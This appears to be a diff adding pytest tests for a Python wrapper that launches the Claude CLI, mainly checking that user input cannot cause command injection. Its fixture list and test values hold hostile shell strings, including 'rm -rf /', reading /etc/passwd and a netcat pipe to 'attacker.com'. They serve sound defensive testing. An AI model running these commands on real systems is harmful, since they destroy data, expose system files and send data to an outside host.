@@ -531,3 +531,181 @@ class TestFindClaudeBinaryGlob:
         ext_dir.mkdir(parents=True)
         monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
         assert _find_claude_binary() is None
+
+    def test_prefers_highest_version_extension(self, tmp_path, monkeypatch):
+        """Multiple installed versions → the sorted-descending pick wins."""
+        ext_dir = tmp_path / ".vscode" / "extensions"
+        for ver in ("0.1.0", "0.2.5", "0.1.9"):
+            p = (
+                ext_dir
+                / f"anthropic.claude-code-{ver}"
+                / "resources"
+                / "native-binary"
+                / "claude.exe"
+            )
+            p.parent.mkdir(parents=True)
+            p.write_bytes(b"\x00")
+        monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
+        result = _find_claude_binary()
+        assert result is not None
+        assert "0.2.5" in str(result)
+
+
+# =============================================================================
+# Command injection prevention — TK-393 security requirement
+#
+# All four entrypoints (run_claude_code, run_claude_chat, run_claude_prompt,
+# run_claude_prompt_async) spawn the Claude binary via arg-list subprocess
+# calls, never `shell=True`. These tests lock in that property: shell
+# metacharacters in user-controlled fields must flow through as literal
+# argv tokens, not be interpreted by a shell.
+# =============================================================================
+
+
+SHELL_METACHARACTERS = [
+    "; rm -rf /",
+    "`whoami`",
+    "$(id)",
+    "&& cat /etc/passwd",
+    "| nc attacker.com 4444",
+    "'; DROP TABLE users; --",
+    "prompt\nmalicious second line",
+]
+
+
+class TestCommandInjectionPrevention:
+    """Verify user input never reaches a shell — only argv tokens to Claude CLI."""
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
+    async def test_run_claude_code_passes_prompt_as_single_arg(self, evil):
+        """Malicious prompt content sits in argv[i+1] after '-p' as one literal token."""
+        proc = _make_async_proc(returncode=0, stdout=b"safe")
+        captured = {}
+
+        async def fake_create(*args, **kwargs):
+            captured["args"] = args
+            captured["kwargs"] = kwargs
+            return proc
+
+        with patch(
+            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
+        ):
+            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
+                await run_claude_code(evil)
+
+        args = list(captured["args"])
+        # No shell=True kwarg — asyncio.create_subprocess_exec doesn't accept it anyway,
+        # but verify we used the exec (argv) variant
+        assert "shell" not in captured["kwargs"]
+        prompt_idx = args.index("-p") + 1
+        # The entire malicious string arrives as one token, unsplit
+        assert args[prompt_idx] == evil
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
+    async def test_run_claude_chat_passes_prompt_as_single_arg(self, evil):
+        proc = _make_async_proc(returncode=0, stdout=b'{"result": "safe"}')
+        captured = {}
+
+        async def fake_create(*args, **kwargs):
+            captured["args"] = args
+            return proc
+
+        with patch(
+            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
+        ):
+            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
+                await run_claude_chat(evil)
+
+        args = list(captured["args"])
+        prompt_idx = args.index("-p") + 1
+        assert args[prompt_idx] == evil
+
+    @pytest.mark.asyncio
+    async def test_run_claude_chat_session_id_passes_as_arg(self):
+        """A malicious session_id must reach argv as a literal token after --resume."""
+        evil_session = "abc; rm -rf /"
+        proc = _make_async_proc(returncode=0, stdout=b'{"result": "ok"}')
+        captured = {}
+
+        async def fake_create(*args, **kwargs):
+            captured["args"] = args
+            return proc
+
+        with patch(
+            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
+        ):
+            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
+                await run_claude_chat("hi", session_id=evil_session)
+
+        args = list(captured["args"])
+        resume_idx = args.index("--resume") + 1
+        assert args[resume_idx] == evil_session
+
+    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
+    def test_run_claude_prompt_uses_arg_list_not_shell(self, evil):
+        mock_result = MagicMock()
+        mock_result.returncode = 0
+        mock_result.stdout = '{"result": "ok"}'
+        mock_result.stderr = ""
+
+        with patch("agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")):
+            with patch(
+                "agent.claude_code_runner.subprocess.run", return_value=mock_result
+            ) as mock_run:
+                run_claude_prompt(evil)
+
+        call = mock_run.call_args
+        # First positional arg is the argv list (never a string, never shell=True)
+        argv = call.args[0]
+        assert isinstance(argv, list)
+        assert call.kwargs.get("shell", False) is False
+        prompt_idx = argv.index("-p") + 1
+        assert argv[prompt_idx] == evil
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("evil", SHELL_METACHARACTERS)
+    async def test_run_claude_prompt_async_uses_arg_list(self, evil):
+        proc = _make_async_proc(returncode=0, stdout=b'{"result": "ok"}')
+        captured = {}
+
+        async def fake_create(*args, **kwargs):
+            captured["args"] = args
+            captured["kwargs"] = kwargs
+            return proc
+
+        with patch(
+            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
+        ):
+            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
+                await run_claude_prompt_async(evil)
+
+        args = list(captured["args"])
+        assert "shell" not in captured["kwargs"]
+        prompt_idx = args.index("-p") + 1
+        assert args[prompt_idx] == evil
+
+    @pytest.mark.asyncio
+    async def test_image_paths_with_metacharacters_stay_in_prompt_arg(self):
+        """Paths with shell metacharacters are embedded in the prompt, not passed as flags."""
+        evil_path = "/tmp/img; rm -rf /.png"
+        proc = _make_async_proc(returncode=0, stdout=b"ok")
+        captured = {}
+
+        async def fake_create(*args, **kwargs):
+            captured["args"] = args
+            return proc
+
+        with patch(
+            "agent.claude_code_runner._find_claude_binary", return_value=Path("/fake/claude")
+        ):
+            with patch("asyncio.create_subprocess_exec", side_effect=fake_create):
+                await run_claude_code("analyze", image_paths=[evil_path])
+
+        args = list(captured["args"])
+        prompt_idx = args.index("-p") + 1
+        # The evil path is inside the single prompt argv token
+        assert evil_path in args[prompt_idx]
+        # And no stray argv token matches it as a standalone arg
+        assert args.count(evil_path) == 0
